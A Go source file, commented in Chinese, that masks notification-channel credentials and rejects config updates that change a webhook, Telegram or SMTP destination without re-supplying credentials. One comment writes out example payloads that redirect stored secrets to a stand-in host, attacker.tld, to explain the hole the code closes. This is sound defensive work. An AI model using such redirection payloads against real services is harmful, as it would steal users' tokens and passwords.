package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix 是掩碼值的標記字首。API 回顯憑據時用帶此字首的值替換真實內容，
// 更新介面收到帶此字首的值即理解為「保持庫中原值不變」。
//
// 用字首而不是空串或某個固定常量，是為了能順帶帶上一點可辨識資訊
// （見 MaskedValue），讓使用者區分得出「這是哪個機器人」而不必重新貼上金鑰。
const MaskedPrefix = "__masked__"

// MaskedValue 生成一個掩碼值：
//
//	"__masked__"              原值太短，不給任何提示
//	"__masked__:…ab12cd"      帶上原值末 6 位作為辨識提示
//
// 只暴露末 6 位是刻意選擇的：Webhook 地址的辨識資訊在末段（如企業微信的 key、
// 飛書的機器人 id），而字首部分各機器人相同、沒有辨識價值。末 6 位不足以
// 還原憑據，但足以讓配置者認出「是我那個群」。
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked 報告某個值是否為掩碼值（即介面回顯後未被修改）。
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig 返回配置的副本，把該渠道的憑據欄位替換成掩碼值。
//
// 未知渠道型別返回空 map 而不是原配置——寧可讓 UI 顯示「配置不可用」，
// 也不要在渠道型別無法識別時把可能含憑據的原始內容整個吐回去。
// 非憑據欄位原樣保留，UI 才能正常展示。
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// headers 這類巢狀結構整體按一個憑據處理：逐個子鍵判斷需要每個渠道
		// 再宣告一套「哪些子鍵是憑據」的規則，複雜度遠超收益。
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials 表示「目標地址變了，但呼叫方沒有對
// 憑據欄位表態」。返回它而不是默默放行或默默丟棄憑據，理由見 PrepareConfigUpdate。
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // 發生變化的目的地鍵
	Missing []string // 未顯式表態的憑據鍵
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "目標地址（" + strings.Join(e.Changed, "、") + "）已變更，請同時重新填寫憑據欄位（" +
		strings.Join(e.Missing, "、") + "）：填入新值，或顯式留空表示不再需要憑據。" +
		"原憑據只對舊地址有效，繼續沿用等於把它交給新地址。"
}

// PrepareConfigUpdate 合併渠道配置，並處理「目標地址變更」這一安全敏感情況。
//
// 它替代裸的 MergeConfig 用在渠道更新路徑上，解決的是這樣一條實測可行的路徑：
// 目標地址（訊息發往哪）與憑據（用什麼身份發）是兩套獨立欄位，而 MergeConfig
// 對「未提及的鍵」一律保留庫中原值。於是任何能 PATCH 渠道的人只要**只改地址、
// 對憑據避而不談**，就能讓伺服器把庫裡的真憑據發到自己控制的端點：
//
//	webhook  {config:{url:"https://attacker.tld"}}  → 原始 Authorization 頭隨請求外發
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<真Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → STARTTLS 後交出使用者名稱與密碼
//
// 這條路徑完全靜默、不依賴重定向（所以拒絕跨主機跳轉擋不住它），
// 而且直接擊穿了本包掩碼機制的目標——「憑據不回顯給瀏覽器」。
//
// 規則：只要某個目的地鍵被改成新值，呼叫方就必須對**每一個**憑據鍵顯式表態：
//   - 給出新值 → 用新值
//   - 顯式傳空串 → 該欄位不再需要憑據（保留清空語義）
//   - 原樣回傳掩碼值 / 乾脆不提這個鍵 → 拒絕
//
// 第三種之所以也拒絕，是因為「掩碼值」的含義正是「沿用舊憑據」，而舊憑據
// 只對舊地址有效。這裡刻意不做「自動丟棄憑據」——那對可選憑據欄位
// （webhook 的 headers、email 的 password）會靜默變成「鑑權沒了但介面返回 200」，
// 比報錯更難排查。寧可讓操作者多填一次。
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("渠道型別 %q 未註冊", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// 非字串的憑據值（如 webhook 的 headers 是個物件）裡若嵌著掩碼字面量，
	// 說明呼叫方把「保持原值」的哨兵塞進了結構體內部。MergeConfig 只認「字串
	// 且帶字首」為掩碼，這種形態會被當普通物件原樣存下去——庫裡真的落下字面量
	// "__masked__"，後續鑑權靜默失效且沒有任何報錯。寧可拒掉。
	//
	// 這個檢查必須放在**最前面**：地址沒變時會走提前返回，放在後面就等於
	// 只覆蓋了「改地址」這一條路徑（第一版就是這麼放錯的，測試直接抓到了）。
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// 找出真正被改掉的目的地鍵。掩碼值等於「沒改」。
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// 地址沒變，走普通合併（掩碼值保留原值、空串清空、其餘覆蓋）。
		return MergeConfig(stored, incoming), nil
	}

	// 地址變了：要求對每個憑據鍵顯式表態。
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers 拒絕把掩碼哨兵嵌在非字串結構裡提交。
//
// 掩碼機制的前提是「整個值就是個字串」。像 webhook 的 headers 這種物件欄位，
// 只能整體掩碼（寫成字串 "__masked__"）或整體提交；把哨兵塞進物件內部
// 既表達不了「保持不變」，又會被當成真實值存進庫。
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("欄位 %s 的內容裡含掩碼標記 %q：該欄位只能整體留空表示沿用、或整體提交新值，不能在結構體內部夾帶掩碼佔位",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue 比較兩個配置值是否等價。用 JSON 序列化比較是為了順帶處理
// 型別差異——前端提交的埠是 number，而庫裡讀回來的是 float64，直接 == 會誤判。
//
// 「空」必須先歸一化再比較：空串與「鍵不存在」在這個配置模型裡是同一個狀態，
// 因為 MergeConfig 把空串當顯式清空、直接 delete 掉該鍵。不歸一化的話，一個
// 始終留空的可選目的地欄位（Telegram 的 base_url 是唯一這樣的欄位：留空即用
// 官方地址）會走成這條路徑——
//
//	新建時存下 base_url:""  →  第一次儲存被 MergeConfig 刪鍵
//	→ 第二次儲存時 incoming 是 ""、stored 缺鍵，被判成「地址變了」
//	→ 憑據是掩碼值 → 400「目標地址已變更，請同時重新填寫憑據欄位」
//
// 此後每次儲存都失敗，除非使用者重新貼上一遍 Bot Token，而他什麼都沒改。
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue 判定一個配置值是否為「空」。
// 口徑必須與 MergeConfig 的清空判定一致（strings.TrimSpace(s) == ""），
// 否則會出現「MergeConfig 認為該刪、sameConfigValue 認為有值」的夾縫。
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig 把 incoming 合併到 stored 之上，用於更新渠道配置。
//
// 規則：
//   - incoming 裡值為掩碼的鍵 → 保留 stored 的原值（使用者沒改這個欄位）
//   - incoming 裡值為空串的鍵 → 視為顯式清空，刪除該鍵
//   - 其餘鍵 → 用 incoming 的值覆蓋
//   - stored 裡有而 incoming 裡沒有的鍵 → 保留（區域性更新語義）
//
// 空串是否算「清空」需要明確：前端表單把未填的欄位提交為空串，
// 若把它當成有效值寫入，會把「留空以保留原值」的欄位真的清掉。
// 這裡選擇顯式清空，因為要清除一個設錯的欄位時，使用者沒有別的表達方式
// （拖走欄位可區分「未提供」與「提供空值」，但 UI 用不到這個區別）。
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // 掩碼值 = 未修改，保留 stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
